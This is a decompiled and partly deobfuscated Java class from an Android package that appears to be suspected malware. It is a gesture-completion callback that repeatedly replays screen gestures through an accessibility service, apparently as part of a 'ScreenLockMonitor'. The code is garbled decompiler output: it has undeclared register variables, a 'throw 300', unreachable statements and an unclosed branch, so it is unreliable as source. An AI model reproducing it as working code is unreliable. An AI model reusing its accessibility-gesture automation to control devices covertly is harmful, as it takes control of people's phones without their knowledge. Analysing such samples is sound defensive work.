package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: ScreenLockMonitor_3
 * Original: Lcom/tencent/Loc_tunesxconcerningn10_k$3;
 */
class ScreenLockMonitor_3 extends AccessibilityService$GestureResultCallback {

    // === FIELDS ===
    final AccessibilityServiceCore val$classGen12;
    final int[] val$currentCount;
    final Path val$path;

    // === METHODS ===

     void Constructor(int[] param0, Path param1, AccessibilityServiceCore param2) {
        v0.val$currentCount = v1;
        v0.val$path = v2;
        v0.val$classGen12 = v3;
        // new AccessibilityService$GestureResultCallback()
        return;
    }

    public void onCancelled(GestureDescription param0) {
        v0.onCancelled(v1);
        return;
    }

    public void onCompleted(GestureDescription param0) {
        v0 = v3.val$currentCount;
        v1 = 0;
        v2 = v0[0];
        if (v2 <= 0) { // goto +26
        v2 = v2 + -1;
        v0[0] = v2;
        v0 = v3.val$path;
        ScreenLockMonitor.access$400(v0, v2, 0);
        v0 = 300;
        Thread.sleep(300, 0);
        // goto (branch)
        // new RuntimeException(v4)
        throw 300;
        v3.onCompleted(v4);
        return;
    }
}
